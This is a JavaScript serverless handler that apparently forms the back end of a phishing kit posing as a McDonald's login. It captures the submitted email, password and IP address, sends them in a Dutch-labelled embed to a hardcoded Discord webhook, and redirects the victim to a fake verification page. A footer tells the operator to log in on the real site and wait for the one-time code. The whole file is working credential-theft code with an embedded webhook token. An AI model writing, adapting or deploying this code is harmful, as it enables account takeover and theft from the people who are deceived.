export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).send('Method not allowed');
    }

    const email = req.body.username || '';
    const password = req.body.password || '';
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

    const webhook = 'https://discord.com/api/webhooks/1504870768108900462/zwR2khNQ-Om9xYfoeRNO7RPKQD15MZhHM8kRFRhDz1jujqSkEMEJ1hKGSdjpsREFMfwO';

    await fetch(webhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            embeds: [{
                title: '🔑 **LOGIN GEGEVENS ONTVANGEN**',
                color: 0xFFA500,
                fields: [
                    { name: '📧 Email', value: '```' + email + '```', inline: false },
                    { name: '🔑 Wachtwoord', value: '```' + password + '```', inline: false },
                    { name: '🌐 IP', value: '```' + ip + '```', inline: false }
                ],
                footer: { text: 'Log zelf in op mcdonaldsapps.com en wacht op de OTP' },
                timestamp: new Date().toISOString()
            }]
        })
    });

    res.redirect(302, '/mcdonalds/verify?email=' + encodeURIComponent(email));
}